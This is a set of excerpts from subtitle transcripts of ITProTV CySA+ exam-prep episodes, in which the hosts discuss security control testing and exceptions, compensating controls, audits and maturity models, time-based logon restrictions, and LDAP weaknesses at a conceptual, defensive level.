And\n\n452\n00:21:46.930 --> 00:21:49.090\nI like the way you put it you\nknow should be done regularly.\n\n453\n00:21:49.090 --> 00:21:50.324\nThis isn't a-\n&gt;&gt; [LAUGH] One and done.\n\n454\n00:21:50.324 --> 00:21:52.131\n&gt;&gt; Put the control in place, test it and\n\n455\n00:21:52.131 --> 00:21:53.120\nI'm good.\n\n456\n00:21:53.120 --> 00:21:58.180\nBecause again like the camera, it gets\nbumped accidentally, the wind moves it.\n\n457\n00:21:58.180 --> 00:22:02.580\nOr firewall rules, somebody puts a new\nrule in place and gets the order wrong and\n\n458\n00:22:02.580 --> 00:22:04.190\nall of a sudden it's trumping other rules.\n\n459\n00:22:04.190 --> 00:22:05.160\nSo it's something you\n\n460\n00:22:05.160 --> 00:22:06.918\nhave to test regularly.\n&gt;&gt; Exactly.\n\n461\n00:22:06.918 --> 00:22:10.152\nThere's also exceptions\nthat you'll have to manage,\n\n462\n00:22:10.152 --> 00:22:12.858\ncuz not everything is a one size fits all.\n\n463\n00:22:12.858 --> 00:22:18.660\nThere's always outliers and things\nof that nature so, how do I do that?\n\n464\n00:22:18.660 --> 00:22:20.150\nWell, you put that in a procedure.\n\n465\n00:22:20.150 --> 00:22:24.310\nIf you do have something that seems to be\nan exception to the rule, heres how you\n\n466\n00:22:24.310 --> 00:22:29.620\nwould properly go through what channels\nto make sure that that is allowable.\n\n467\n00:22:29.620 --> 00:22:32.123\nYou can't just go well,\nit's just outside of the rules but,\n\n468\n00:22:32.123 --> 00:22:34.206\nthe rule said I can't do that,\nso I can't do that.\n\n469\n00:22:34.206 --> 00:22:38.749\nThere are always exceptions,\nwe just have to kinda make its own\n\n470\n00:22:38.749 --> 00:22:43.817\nsubcategory of subprocedure to say,\nwell this is an exception.\n\n471\n00:22:43.817 --> 00:22:49.530\nIf you see this then follow\nprocedure 2B instead of 2A, right?\n\n472\n00:22:49.530 --> 00:22:51.850\nSo there you go.\n\n473\n00:22:51.850 --> 00:22:54.240\nDon't forget all exceptions\nmust be authorized,\n\n474\n00:22:54.240 --> 00:22:54.900\nyou can't just say-\n&gt;&gt; [LAUGH]\n\n475\n00:22:54.900 --> 00:22:55.510\n&gt;&gt; That's what I'm gonna do.\n\n476\n00:22:55.510 --> 00:22:58.610\nYou gotta get buy in,\nchange management, don't forget.\n\n477\n00:22:58.610 --> 00:23:01.130\nGood reasons must be submitted,\n\n478\n00:23:01.130 --> 00:23:04.040\nwhich will help you get\nthe authorization you're looking for.\n\n479\n00:23:04.040 --> 00:23:06.274\nAll exceptions must be documented,\n\n480\n00:23:06.274 --> 00:23:11.470\nyou wanna make sure these are documented\nbecause thinking in a security way, right?\n\n481\n00:23:11.470 --> 00:23:12.904\nIn security or securely,\n\n482\n00:23:12.904 --> 00:23:14.670\nthinking securely.\n&gt;&gt; Thinking\n\n483\n00:23:14.670 --> 00:23:15.810\nsecurely?\n&gt;&gt; Here we go.\n\n484\n00:23:15.810 --> 00:23:17.520\nThat's the word I'm looking for, right?\n\n485\n00:23:18.598 --> 00:23:23.420\nDocumentation of these, if I don't know\nit's there, now it's a vulnerability.\n\n486\n00:23:23.420 --> 00:23:27.610\nBecause why is Bob bypassing\nthe gate everyday?\n\n487\n00:23:27.610 --> 00:23:29.500\nWhy is he driving around?\n\n488\n00:23:29.500 --> 00:23:32.280\nWell, cuz Bob has a car that\ndoesn't fit through the gate.\n\n489\n00:23:32.280 --> 00:23:33.780\nAll right, so he has to bypass it.\n\n490\n00:23:33.780 --> 00:23:34.665\nI didn't know that.\n\n491\n00:23:34.665 --> 00:23:35.885\nIs anybody else doing that?\n\n492\n00:23:35.885 --> 00:23:37.245\n[SOUND]\n&gt;&gt; [LAUGH]\n\n493\n00:23:37.245 --> 00:23:38.525\n&gt;&gt; Is only Bob allowed to do that?\n\n494\n00:23:38.525 --> 00:23:42.360\n[SOUND]\n&gt;&gt; Right, not good, right?\n\n495\n00:23:42.360 --> 00:23:45.858\nDocument the fact that Bob has\nan oversized vehicle, we've allowed for\n\n496\n00:23:45.858 --> 00:23:49.358\nthat oversized vehicle because it's\na van that carries his equipment or\n\n497\n00:23:49.358 --> 00:23:52.471\nsomething like that, and\nhe needs to be able to bypass the gate.\n\n498\n00:23:52.471 --> 00:23:56.728\nBut not Sue, Sue's got a compact car,\nfits right through,\n\n499\n00:23:56.728 --> 00:23:58.909\nwhy is she bypassing the gate?\n\n500\n00:23:58.909 --> 00:23:59.567\nI don't know.\n\n501\n00:23:59.567 --> 00:24:04.181\nOkay, so you start seeing the problem,\nsecurity wise.\n\n502\n00:24:04.181 --> 00:24:05.695\nWhat else have we got here?\n\n503\n00:24:05.695 --> 00:24:07.188\nA compensating controls development.\n\n504\n00:24:07.188 --> 00:24:10.904\nDon't forget about compensating controls,\n\n505\n00:24:10.904 --> 00:24:15.294\nwe don't have anything\nthat's built to handle this.\n\n506\n00:24:15.294 --> 00:24:20.256\nOr I can't update this system,\nbecause then everything breaks, and\n\n507\n00:24:20.256 --> 00:24:22.450\nwe go out of business, right?\n\n508\n00:24:22.450 --> 00:24:26.960\nThese are extreme scenarios,\nbut they do occur, right?\n\n509\n00:24:26.960 --> 00:24:27.676\nSo what do we do?\n\n510\n00:24:27.676 --> 00:24:31.009\nWell we create a compensating control,\nsomething that works just as\n\n511\n00:24:31.009 --> 00:24:34.341\ngood if not better than the control\nthat would have been in place, and\n\n512\n00:24:34.341 --> 00:24:35.731\nwe do that instead, right?\n\n513\n00:24:35.731 --> 00:24:37.148\nSo we just work with that.\n\n514\n00:24:37.148 --> 00:24:42.169\nMake sure that they meet the intent and\nthe rigor of the original requirement,\n\n515\n00:24:42.169 --> 00:24:44.900\nremember I got these from PC IDSS stuff.\n\n516\n00:24:44.900 --> 00:24:46.520\nBut it fits to just about anything,\n\n517\n00:24:46.520 --> 00:24:49.080\nwhen you start talking about\ncompensating controls.\n\n518\n00:24:49.080 --> 00:24:52.490\nMust provide similar level of defense as\nthe original requirement and go above and\n\n519\n00:24:52.490 --> 00:24:54.200\nbeyond the other requirements.\n\n520\n00:24:54.200 --> 00:24:55.780\nAnd then remediation plans,\n\n521\n00:24:57.730 --> 00:25:00.840\nthese are definitely things\nyou want to get a hand on.\n\n522\n00:25:00.840 --> 00:25:03.040\nSo, created procedure for remediation.\n\n523\n00:25:04.330 --> 00:25:07.840\nDon't just leave it to, as Ryan says, you\nthrow the spaghetti against the wall and\n\n524\n00:25:07.840 --> 00:25:09.090\nsee what sticks.\n\n525\n00:25:09.090 --> 00:25:11.310\nNot the best way to go about things.\n\n526\n00:25:11.310 --> 00:25:14.558\nTry to implement remediation\nin some procedural way so\n\n527\n00:25:14.558 --> 00:25:17.242\nthat people are following\nthe right things,\n\n528\n00:25:17.242 --> 00:25:20.712\nthey're not gonna actually\ndelete something or modify.\n\n529\n00:25:20.712 --> 00:25:25.222\nRemember that CIA triad is always just\nlike this over arching watermark on\n\n530\n00:25:25.222 --> 00:25:28.580\neverything you see when\nit comes to security.\n\n531\n00:25:28.580 --> 00:25:34.530\nSo, you wanna make a procedure that would\nfall in line with keeping them in check.\n\n532\n00:25:34.530 --> 00:25:36.550\nAll right, Mike we're gonna go\njust a hair long cuz we've just\n\n533\n00:25:36.550 --> 00:25:37.110\ngot a little bit-\n\n534\n00:25:37.110 --> 00:25:37.860\n&gt;&gt; Yeah.\n&gt;&gt; To go.\n\n535\n00:25:37.860 --> 00:25:38.820\nIt's not worth throwing up\n\n536\n00:25:38.820 --> 00:25:39.630\nanother show.\n&gt;&gt; Okay.\n\n537\n00:25:39.630 --> 00:25:40.870\n&gt;&gt; So we're gonna hammer through this.\n\n538\n00:25:40.870 --> 00:25:43.360\nThis is the verification\nof the quality controls.\n\n539\n00:25:43.360 --> 00:25:45.930\nWe're doing the testing, verifying,\n\n540\n00:25:45.930 --> 00:25:51.140\nthese things are actually doing what\nwe think they should be doing, right?\n\n541\n00:25:51.140 --> 00:25:54.971\nAnd this is in specific ways, not just us\ngoing, hey is that Firewall rule going,\n\n542\n00:25:54.971 --> 00:25:56.428\nlet me test that in happening.\n\n543\n00:25:56.428 --> 00:26:01.200\nThat is part of it, but overarchingly, for\nthe exam, they're talking about things\n\n544\n00:26:01.200 --> 00:26:05.706\nlike audits, assessments, and evaluations\nof what else, making, do you have\n\n545\n00:26:05.706 --> 00:26:10.240\na maturity model and if so, where\nare you inside of that maturity model?\n\n546\n00:26:10.240 --> 00:26:14.510\nSo let's talk about audits,\nthis is outside parties come in,\n\n547\n00:26:14.510 --> 00:26:19.426\nthey're typically some sort of\nformalized group of people that come and\n\n548\n00:26:19.426 --> 00:26:21.697\ndo a very specific type of audit.\n\n549\n00:26:21.697 --> 00:26:27.035\nLooking for compliance, looking for\nbest practices being followed, and if not,\n\n550\n00:26:27.035 --> 00:26:31.991\nthey're going to give you a formal review\nat the end of it, that you can use and\n\n551\n00:26:31.991 --> 00:26:37.208\nsubmit to stakeholders, things of that\nnature to say, we are doing a great job.\n\n552\n00:26:37.208 --> 00:26:41.490\nBecause we had a formal audit and we're\nnot dinged at all, or we had very minor\n\n553\n00:26:41.490 --> 00:26:46.390\ndings, usually corrected, and\nwe took those steps, or we found out\n\n554\n00:26:46.390 --> 00:26:50.225\nwe're on the Titanic [LAUGH] and we've\njust been rearranging the deck chairs.\n\n555\n00:26:50.225 --> 00:26:51.860\n[LAUGH]\n&gt;&gt; This is not good.\n\n556\n00:26:51.860 --> 00:26:53.610\nSo that's what those audits are for.\n\n557\n00:26:53.610 --> 00:26:57.440\nTypically, it's a formal entity coming\nin ad giving you a formal report of\n\n558\n00:26:57.440 --> 00:26:59.570\nthe status of your company overall.\n\n559\n00:26:59.570 --> 00:27:01.840\nWhen it comes to security\nthese are security audits,\n\n560\n00:27:01.840 --> 00:27:04.980\nso they're gonna take a look\nat your security standpoints.\n\n561\n00:27:04.980 --> 00:27:09.396\nYour threats your vulnerabilities, see\nwhat they can find, a lot of times it's do\n\n562\n00:27:09.396 --> 00:27:13.565\nthe penetration test, vulnerability\nassessment tests these kinds of things\n\n563\n00:27:13.565 --> 00:27:17.247\nwould be a part of that, and\nthat will come out in your formal report.\n\n564\n00:27:19.732 --> 00:27:23.267\nEvaluations and assessments,\nthey call them out as separate in\n\n565\n00:27:23.267 --> 00:27:28.250\nthe exam objectives, but definitionally\nit can't really find a difference.\n\n566\n00:27:28.250 --> 00:27:31.585\nMaybe there is one as far as\ncompany is concerned, but\n\n567\n00:27:31.585 --> 00:27:34.856\nbasically this is an informal\nlook at your company.\n\n568\n00:27:34.856 --> 00:27:40.028\nAnd say, we trust that if you\ntell me I'm putting in x,\n\n569\n00:27:40.028 --> 00:27:45.097\ny and z kind of controls and\nprocedures and policies.\n\n570\n00:27:45.097 --> 00:27:48.873\nBut they go great that's a good\nthing you should be doing that and\n\n571\n00:27:48.873 --> 00:27:53.710\nthey kinda trust you, it's much less\nformal, it's more of a trusting thing.\n\n572\n00:27:53.710 --> 00:27:56.810\n&gt;&gt; Regulations might say you've got to get\n\n573\n00:27:56.810 --> 00:28:02.360\na formal audit once a year, but\nI don't want to do it just once a year.\n\n574\n00:28:02.360 --> 00:28:06.660\nSo we might do an enternal type audit\n&gt;&gt; Leading up to that formal one, so\n\n575\n00:28:06.660 --> 00:28:08.990\nthey've got a chance to\nget things ready for that,\n\n576\n00:28:08.990 --> 00:28:12.480\nor a little more frequently\nbecause I don't wanna wait.\n\n577\n00:28:12.480 --> 00:28:15.010\nI can go a whole year\nbefore the next audit and\n\n578\n00:28:15.010 --> 00:28:18.050\nif something happens right\nafter my last audit.\n\n579\n00:28:18.050 --> 00:28:21.780\nI don't wanna find out about it\nthe following year when I come back up for\n\n580\n00:28:21.780 --> 00:28:25.960\nmy next audit, so by doing these internal\nevaluations, a little less formal, but\n\n581\n00:28:25.960 --> 00:28:28.050\ngives us a good look into what's going on.\n&gt;&gt; That's right,\n\n582\n00:28:28.050 --> 00:28:31.540\nand it's just, like Mike said, he's kinda\nhinting around, we're being proactive.\n\n583\n00:28:31.540 --> 00:28:36.220\nIt would be nice to kinda know what\nmy formal audit outcome is gonna be\n\n584\n00:28:36.220 --> 00:28:39.910\nbefore I have the formal audit, and\ndoing the assessment or an evaluation is\n\n585\n00:28:39.910 --> 00:28:43.440\na really good way to figure out that\nlandscape What are your weak spots?\n\n586\n00:28:43.440 --> 00:28:49.590\nStart shoring up the beachhead as it were,\nbefore the attack by the auditors.\n\n587\n00:28:49.590 --> 00:28:50.090\nThey're gonna come in.\n&gt;&gt; [LAUGH]\n\n588\n00:28:50.090 --> 00:28:52.083\n&gt;&gt; Cuz they're gonna nitpick you real\n\n589\n00:28:52.083 --> 00:28:56.045\nhard, whereas you can be a little\nless intensive here with those.\n\n590\n00:28:56.045 --> 00:28:58.470\nMaturity models, these are basically\n\n591\n00:28:58.470 --> 00:29:04.460\na scope of Most security versus\nleast security kind of thing, right.\n\n592\n00:29:04.460 --> 00:29:05.360\nWhen you think of security.\n\n593\n00:29:05.360 --> 00:29:08.690\nGive me another rounds as well, maturity\nmiles just don't apply to security, but\n\n594\n00:29:08.690 --> 00:29:11.690\nhere we are doing plus so,\nthat's what we're gonna talk about.\n\n595\n00:29:11.690 --> 00:29:17.510\nI've got my most secure way that I could\nbe versus the least secure way I could be.\n\n596\n00:29:17.510 --> 00:29:20.380\nSo, we've got immature\nversus fully mature.\n\n597\n00:29:20.380 --> 00:29:23.341\nWhere do I fall on that scope, right?\n\n598\n00:29:23.341 --> 00:29:25.933\nSo, I need to delineate\nsome mid points and\n\n599\n00:29:25.933 --> 00:29:31.090\ngo okay, well we think we fall right here\nso, you can create a maturity models.\n\n600\n00:29:31.090 --> 00:29:35.330\nSome of the security frameworks\nthat we looked out when Jo was on\n\n601\n00:29:35.330 --> 00:29:37.710\nhad maturity models built into them.\n\n602\n00:29:37.710 --> 00:29:40.293\nThe NIST stuff that should look like that,\n\n603\n00:29:40.293 --> 00:29:43.318\nthe cyber security framework\nthat she showed us.\n\n604\n00:29:43.318 --> 00:29:47.673\nThey had a maturity model, that was that\nfour-tiered system where the top one was.\n\n605\n00:29:47.673 --> 00:29:51.760\nCan't remember them off the top of\nmy head now but, I think I had some,\n\n606\n00:29:51.760 --> 00:29:55.350\nI don't, forget this,\nwe're out of time anyway.\n\n607\n00:29:55.350 --> 00:29:57.700\nYou can go back and relook at those notes.\n\n608\n00:29:57.700 --> 00:30:00.468\nBut those four tiers,\nthat's a maturity model, right?\n\n609\n00:30:00.468 --> 00:30:02.270\nCOBIT also had one as well.\n\n610\n00:30:02.270 --> 00:30:07.100\nSo, it's just the what are the ranges,\n\n611\n00:30:07.100 --> 00:30:10.050\nwhere do we stand, where do we want to be,\nand how do we get there?\n\n612\n00:30:10.050 --> 00:30:13.420\nThat's what the maturity\nmodel is gonna allow you to\n\n613\n00:30:13.420 --> 00:30:16.330\nkind of guide that ship, as it were.\n\n614\n00:30:16.330 --> 00:30:21.767\nMike, that is the extent of the policies,\ncontrols, and procedures episodes.\n\n615\n00:30:21.767 --> 00:30:24.553\nAnd I'll have to make some\npolicy controls procedures.\n\n616\n00:30:24.553 --> 00:30:25.633\nYou better on the next time we.\n\n617\n00:30:25.633 --> 00:30:27.849\n[LAUGH]\n&gt;&gt; All right, I loved it Daniel,\n\n618\n00:30:27.849 --> 00:30:31.769\nthought it was great, appreciate those\nexplanations on policies,

You're watching ITPro.TV.\n&gt;&gt; Hello,\n\n5\n00:00:13.081 --> 00:00:17.103\nwelcome to another exciting episode here\nat ITProTV, I'm your host Mike Rodrick.\n\n6\n00:00:17.103 --> 00:00:19.282\nToday we're doing our CySA+, and\n\n7\n00:00:19.282 --> 00:00:24.234\nin this episode we're gonna be taking\na look at identity and access management.\n\n8\n00:00:24.234 --> 00:00:27.173\nHere in the studios is none other than\nDaniel Lowrie, welcome back Daniel.\n\n9\n00:00:27.173 --> 00:00:28.642\n&gt;&gt; Thanks for having me again Mike,\n\n10\n00:00:28.642 --> 00:00:31.946\nalways a pressure be here with you\nenjoying the weather has finally cleared\n\n11\n00:00:31.946 --> 00:00:32.848\nup here in Florida.\n\n12\n00:00:32.848 --> 00:00:35.449\nAnd we're gonna talk\nabout some identity and\n\n13\n00:00:35.449 --> 00:00:39.360\naccess managements when it comes\nto our security systems, right.\n\n14\n00:00:39.360 --> 00:00:41.151\nSo, what does that mean,\nwe're gonna take a look at that.\n\n15\n00:00:41.151 --> 00:00:44.646\nWe're gonna take a look at some of\nthe common ways in which these things\n\n16\n00:00:44.646 --> 00:00:45.544\nare threatened.\n\n17\n00:00:45.544 --> 00:00:50.098\nAnd then some mitigation techniques though\nthat might help us keep the problem\n\n18\n00:00:50.098 --> 00:00:53.590\ndown to a bare minimum.\n&gt;&gt; All right, where do we start with that?\n\n19\n00:00:53.590 --> 00:00:54.467\n&gt;&gt; All right,\n\n20\n00:00:54.467 --> 00:01:00.101\nlet's start with a context based attacks,\nthese are interesting things.\n\n21\n00:01:00.101 --> 00:01:05.070\nBasically your authentication could\nhave many factors that come into\n\n22\n00:01:05.070 --> 00:01:07.769\nplay as you authenticate, right,.\n\n23\n00:01:07.769 --> 00:01:11.524\nSo, well actually let's even farther back,\nlet's start talking about the identity.\n\n24\n00:01:11.524 --> 00:01:15.100\nOkay, lets talk about what an identity,\nso we're on the same page here,\n\n25\n00:01:15.100 --> 00:01:16.090\nset our stage here.\n\n26\n00:01:16.090 --> 00:01:20.419\nAnd then there's who I am,\nnot only like as a person in reality but\n\n27\n00:01:20.419 --> 00:01:22.954\ndigitally as well inside of a system.\n\n28\n00:01:22.954 --> 00:01:26.430\nHave things about me that\nare in the system and\n\n29\n00:01:26.430 --> 00:01:32.211\nthey are going to differentiate my\naccount from Mike's account, right.\n\n30\n00:01:32.211 --> 00:01:36.587\nSo that's an identity, then I'm basically\ntaking the law of identity, slapping it\n\n31\n00:01:36.587 --> 00:01:40.139\ninto a digital system and trying to\nreproduce it as best as possible.\n\n32\n00:01:40.139 --> 00:01:42.874\nSo, that being said-\n&gt;&gt; It's a really important part,\n\n33\n00:01:42.874 --> 00:01:46.001\nobviously, it's what gives us\nthe ability to control access.\n\n34\n00:01:46.001 --> 00:01:49.089\nCuz if I can't identify who's\ntrying to access the resource,\n\n35\n00:01:49.089 --> 00:01:52.769\nhow do I determine if yes, it should\nbe allowed, or no, it shouldn't be?\n\n36\n00:01:52.769 --> 00:01:56.020\nOr yes, if these conditions are met,\nthings like that,\n\n37\n00:01:56.020 --> 00:02:00.423\nthe identity is really the first part of\nthat, as who is this that's trying to\n\n38\n00:02:00.423 --> 00:02:02.107\naccess the resource?\n&gt;&gt; Mike,\n\n39\n00:02:02.107 --> 00:02:06.034\nit's like we're sharing a brain, [LAUGH]\ncuz it's exactly what I was going to\n\n40\n00:02:06.034 --> 00:02:06.954\nsay.\n&gt;&gt; Yeah?\n\n41\n00:02:06.954 --> 00:02:08.396\n&gt;&gt; And so maybe our identities aren't so\n\n42\n00:02:08.396 --> 00:02:10.416\ndifferent, [LAUGH] right?\n&gt;&gt; [LAUGH]\n\n43\n00:02:10.416 --> 00:02:12.585\n&gt;&gt; But that's the idea, Mike nailed it,\n\n44\n00:02:12.585 --> 00:02:16.461\nthat's why I love having him on the show,\ncuz he does bring a lot of good\n\n45\n00:02:16.461 --> 00:02:20.036\ninformation to our conversation,\nand that's exactly right.\n\n46\n00:02:20.036 --> 00:02:24.968\nThat leads us now back to\nthe types of ways that it can\n\n47\n00:02:24.968 --> 00:02:28.982\nbe attacked, identities can be, well,\n\n48\n00:02:28.982 --> 00:02:34.736\nI have a few ways in which my\nidentity can be authenticated.\n\n49\n00:02:34.736 --> 00:02:36.796\nWhat ways can those ways be attacked?\n\n50\n00:02:36.796 --> 00:02:40.006\nSo that's what were gonna look at,\nso let's talk about those conflicts.\n\n51\n00:02:40.006 --> 00:02:42.193\n&gt;&gt; Yeah, cuz if there's a bad guy,\n\n52\n00:02:42.193 --> 00:02:44.859\nI know Daniel has access to resources X.\n\n53\n00:02:44.859 --> 00:02:47.537\nI wanna be Daniel,\nI want the system to think I'm Daniel so\n\n54\n00:02:47.537 --> 00:02:51.762\nthat I can get access to that resource.\n&gt;&gt; Exactly, so let's take a look at some\n\n55\n00:02:51.762 --> 00:02:56.517\nof these contexts in which our identities\nkinda dwell around, here we go.\n\n56\n00:02:56.517 --> 00:03:01.645\nWe got different times, we got\nfrequencies, locations and behavior.\n\n57\n00:03:01.645 --> 00:03:04.617\nThese are the ones they call out for\nthe exam.\n\n58\n00:03:04.617 --> 00:03:09.672\nSo what does that need and what are the\nthreats to those different contents?\n\n59\n00:03:09.672 --> 00:03:14.091\nSo time is basically, when is my identity\n\n60\n00:03:14.091 --> 00:03:18.778\nallowed to be useful\ninside of this system?\n\n61\n00:03:18.778 --> 00:03:22.524\nDates, is it Monday to Friday,\nis it Wednesday to Thursday,\n\n62\n00:03:22.524 --> 00:03:24.118\nis this only on weekends?\n\n63\n00:03:24.118 --> 00:03:29.441\nWhen is the context in which I am\nallowed to be a user on the system and\n\n64\n00:03:29.441 --> 00:03:31.067\nbe active, right.\n\n65\n00:03:31.067 --> 00:03:33.512\nSo that's an important\npiece of information.\n\n66\n00:03:33.512 --> 00:03:38.996\nSo do we set work hours, do I say,\nMike, you only work 8:00 to 5:00.\n\n67\n00:03:38.996 --> 00:03:45.229\nYou don't need to log in It's 9 o'clock\nat night, so I can set parameters.\n\n68\n00:03:45.229 --> 00:03:48.316\nAnd again, you just think, okay that's\ncool we are all familiar with that kind of\n\n69\n00:03:48.316 --> 00:03:51.257\nthing being able to switch an active\ndirectory we've got the lovely little-\n\n70\n00:03:51.257 --> 00:03:52.401\n&gt;&gt; Log on hours.\n\n71\n00:03:52.401 --> 00:03:52.920\n&gt;&gt; Yeah,\n\n72\n00:03:52.920 --> 00:03:57.851\njust a graphic chart you drag you\ndrop you click you're done it's so\n\n73\n00:03:57.851 --> 00:04:01.758\nsweet we love it but\nwhy would I do that, here's why.\n\n74\n00:04:01.758 --> 00:04:06.460\nBecause time-based attacks are,\nif I can log on anytime he wants,\n\n75\n00:04:06.460 --> 00:04:09.603\nthen as an attacker, that's to my benefit.\n\n76\n00:04:09.603 --> 00:04:13.439\nI can now sit at my terminal for\nas long as I want and\n\n77\n00:04:13.439 --> 00:04:17.945\nhammer away at Mike's identity\nuntil I find something.\n\n78\n00:04:17.945 --> 00:04:22.131\nBut if we've made a control\naround that and say, well,\n\n79\n00:04:22.131 --> 00:04:25.886\nMike can only log in from time x to z on,\nwhy dates?\n\n80\n00:04:25.886 --> 00:04:30.910\nNow I've now reduced the attack\nservice that someone could try\n\n81\n00:04:30.910 --> 00:04:35.757\nto impersonate or\nget into my using my Mike's credentials.\n\n82\n00:04:35.757 --> 00:04:38.985\nSo you see what it does, and\nnow it makes it much more difficult.\n\n83\n00:04:38.985 --> 00:04:42.793\nAgain, goes all the way back to\nthe whole idea of defense in depth,\n\n84\n00:04:42.793 --> 00:04:43.953\nlayered defenses.\n\n85\n00:04:43.953 --> 00:04:45.670\nIf we haven't beat that drum yet,\n\n86\n00:04:45.670 --> 00:04:49.455\nI think we should probably do that.\n&gt;&gt; [LAUGH] This particular controler is\n\n87\n00:04:49.455 --> 00:04:52.793\none that's pretty darn easy\nto implement in both systems.\n\n88\n00:04:52.793 --> 00:04:55.600\nAnd I see it being\nimplemented probably ever.\n\n89\n00:04:55.600 --> 00:04:59.202\nAnd honestly you don't have to cut it\ndown, I know Mike clocks in at 8 and\n\n90\n00:04:59.202 --> 00:05:02.176\nhe logs off at 5, so\nthat's when I'm gonna set the hours.\n\n91\n00:05:02.176 --> 00:05:04.714\nObviously that's gonna set some\nadministrative overhead, some issues.\n\n92\n00:05:04.714 --> 00:05:09.511\nWhat if my works leave, what if I\ngotta works from home a little bit?\n\n93\n00:05:09.511 --> 00:05:14.375\nBut I could say that after 11 o'clock,\nI know Mike is not logging in.\n\n94\n00:05:14.375 --> 00:05:17.707\nAnd until 6 o'clock in the morning\nthere's a really good chance,\n\n95\n00:05:17.707 --> 00:05:21.110\nthe odds are pretty slim,and I'd\nrather deal with those outliers.\n\n96\n00:05:21.110 --> 00:05:25.150\nBut if I said 11 to 6, that's 7 hours\nwhere that account is useless, and\n\n97\n00:05:25.150 --> 00:05:28.291\nthose are prime attack hour, right.\n&gt;&gt; Yeah, yeah,\n\n98\n00:05:28.291 --> 00:05:33.119\nbecause everybody is asleep, no one\nis going to slow down the response if\n\n99\n00:05:33.119 --> 00:05:38.280\nan alert does occur because people\nare sleeping usually during those hours.\n\n100\n00:05:38.280 --> 00:05:40.898\nIt's just the normal habit of reality.\n&gt;&gt;

And when I first thought of it, you\n\n411\n00:21:30.520 --> 00:21:34.260\nspend a lot of time, Daniel, talking about\nthe importance of protecting identities.\n\n412\n00:21:34.260 --> 00:21:38.840\nNow, you're talking about a storage\nlocation for all of those identities.\n\n413\n00:21:38.840 --> 00:21:40.960\nObviously this is gonna be something\nthat you have to protect as well.\n\n414\n00:21:40.960 --> 00:21:43.250\n&gt;&gt; Yeah, and if you think about it.\n\n415\n00:21:43.250 --> 00:21:45.480\nSo I've got unidentity.\n\n416\n00:21:45.480 --> 00:21:47.720\nMaybe, I'm able to compromise that, okay.\n\n417\n00:21:47.720 --> 00:21:50.530\nDepending on the identity that you get,\nit could be not a big deal.\n\n418\n00:21:50.530 --> 00:21:51.210\nIt could be a big deal.\n\n419\n00:21:51.210 --> 00:21:56.440\nBut what if I got the basket that\nholds the identities, all of them?\n\n420\n00:21:57.490 --> 00:21:59.330\nWhat will I be able to do then?\n\n421\n00:21:59.330 --> 00:22:00.630\nThat could be bad, right?\n\n422\n00:22:00.630 --> 00:22:03.350\nThat's a much larger fallout.\n\n423\n00:22:03.350 --> 00:22:06.481\nSo we need to be able to protect\nour identity repositories.\n\n424\n00:22:06.481 --> 00:22:08.006\nSo let's get back into LDAP.\n\n425\n00:22:08.006 --> 00:22:11.710\nLDAP is very common, we see this all over\nthe place, not just in Active Directory,\n\n426\n00:22:11.710 --> 00:22:13.210\nbut in other places as well.\n\n427\n00:22:13.210 --> 00:22:17.569\nEven websites use LDAP in same ways,\nmaybe you're doing LDAP queries,\n\n428\n00:22:17.569 --> 00:22:20.930\nOpenLDAP is a very popular\nimplementation of this.\n\n429\n00:22:20.930 --> 00:22:23.970\nSo you could see this in\njust about anywhere, so\n\n430\n00:22:23.970 --> 00:22:28.610\nyou gotta be familiar with some of\nthe weaknesses associated with LDAP and\n\n431\n00:22:28.610 --> 00:22:32.080\nsome of the controls that you can put into\nplace to try to store it back up, right?\n\n432\n00:22:32.080 --> 00:22:35.090\nSo let's talk about it here,\nit's basically like a phone book for\n\n433\n00:22:35.090 --> 00:22:36.620\ndigital identities.\n\n434\n00:22:36.620 --> 00:22:38.450\nContact information, that kind of stuff.\n\n435\n00:22:38.450 --> 00:22:42.130\nIf I'm on a system with Mike, how do I\nknow what Mike's contact information is,\n\n436\n00:22:42.130 --> 00:22:45.830\nthat was the impetus behind creating LDAP.\n\n437\n00:22:45.830 --> 00:22:48.170\nI wanna be able to know\nwho's part of my system.\n\n438\n00:22:48.170 --> 00:22:51.340\nAnd go, what's his email, what's his\nphone number, what office is he in,\n\n439\n00:22:51.340 --> 00:22:52.350\nthat kind of thing.\n\n440\n00:22:52.350 --> 00:22:54.150\nThat's what this was for.\n\n441\n00:22:54.150 --> 00:23:00.770\nAlso through that, you start to see\norganizational hierarchy, right.\n\n442\n00:23:00.770 --> 00:23:04.950\nAs an attacker that could be good\ninformation, I can use that.\n\n443\n00:23:04.950 --> 00:23:06.620\nBut it's just kind of\nthe nature of the beast.\n\n444\n00:23:08.990 --> 00:23:13.750\nAlso it's very susceptible\nto denial of service,\n\n445\n00:23:15.180 --> 00:23:18.920\nbecause, well, I've got my repository.\n\n446\n00:23:18.920 --> 00:23:23.024\nWell, if I start hammering it with\nrequests or for authentication maybe, and\n\n447\n00:23:23.024 --> 00:23:26.146\nit's going, yeah, let me get,\nthere's another one.\n\n448\n00:23:26.146 --> 00:23:29.540\n[INAUDIBLE] I'm trying to handle\nthat when I'm, all right?\n\n449\n00:23:29.540 --> 00:23:33.850\nYou don't see DoS and\nDDoS problems with these or\n\n450\n00:23:33.850 --> 00:23:37.730\nwith LDAP and\nthese other systems a lot anymore,\n\n451\n00:23:37.730 --> 00:23:41.210\nespecially with LDAP, just because\nwe typically are doing replication,\n\n452\n00:23:41.210 --> 00:23:45.300\nthere is multiple servers that could\nhandle the authentication of your users.\n\n453\n00:23:45.300 --> 00:23:46.543\nSo it's much more difficult and\n\n454\n00:23:46.543 --> 00:23:49.210\nthey do a really good job of\nit to be honest with you.\n\n455\n00:23:49.210 --> 00:23:52.890\nBut it is a possibility, it could happen.\n\n456\n00:23:52.890 --> 00:23:55.836\nSo just be aware that denial\nof service is a problem.\n\n457\n00:23:55.836 --> 00:24:02.020\nJust fire up another server and\nuse that to mitigate, right?\n\n458\n00:24:02.020 --> 00:24:09.207\nI don't remember if it's by default but\nit does allow for both anonymous and\n\n459\n00:24:09.207 --> 00:24:13.853\nunauthenticated access, right?\n&gt;&gt; [LAUGH]\n\n460\n00:24:13.853 --> 00:24:15.517\n&gt;&gt; Hey, lt's program that into the system\n\n461\n00:24:15.517 --> 00:24:16.455\n&gt;&gt; [LAUGH]\n\n462\n00:24:16.455 --> 00:24:17.936\n&gt;&gt; But it's there,\n\n463\n00:24:17.936 --> 00:24:20.923\ndon't wanna be turning that on?\n&gt;&gt; Yeah,\n\n464\n00:24:20.923 --> 00:24:22.217\nthat's a tough one, right?\n&gt;&gt; Yeah.\n\n465\n00:24:22.217 --> 00:24:23.274\n&gt;&gt; I guess it depends,\n\n466\n00:24:23.274 --> 00:24:26.953\nI mean, some things are 